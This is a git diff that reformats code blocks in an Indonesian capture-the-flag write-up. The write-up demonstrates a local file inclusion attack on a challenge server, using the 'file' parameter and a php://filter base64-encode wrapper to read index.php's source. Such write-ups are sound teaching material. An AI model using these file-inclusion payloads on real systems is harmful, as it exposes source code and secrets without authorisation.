@@ -118,7 +118,9 @@ ternyata berhasil
 
 setelah beberapa lama mutar-mutar saya coba memanggil `index.php?file=index.php` apakah kode phpnya bakal muncul? 
 
-```http://167.71.207.218:35081/index.php?file=index.php```
+```
+http://167.71.207.218:35081/index.php?file=index.php
+```
 
 ![register](../writeup/register/012.png)
 
@@ -142,7 +144,9 @@ expect:// — Process Interaction Streams
 
 sepertinya ada yang menarik pada `Wrappers` dibawah ini 
 
-```php:// — Accessing various I/O streams```
+```
+php:// — Accessing various I/O streams
+```
 
 > __Note__
 >
@@ -150,7 +154,9 @@ sepertinya ada yang menarik pada `Wrappers` dibawah ini
 
 ok mari kita coba melihat isi kode dari file index.php dengan melakukan conver ke `base64`
 
-```http://167.71.207.218:35081/index.php?file=php://filter/convert.base64-encode/resource=index.php```
+```
+http://167.71.207.218:35081/index.php?file=php://filter/convert.base64-encode/resource=index.php
+```
 
 dan ternyata bisa
 
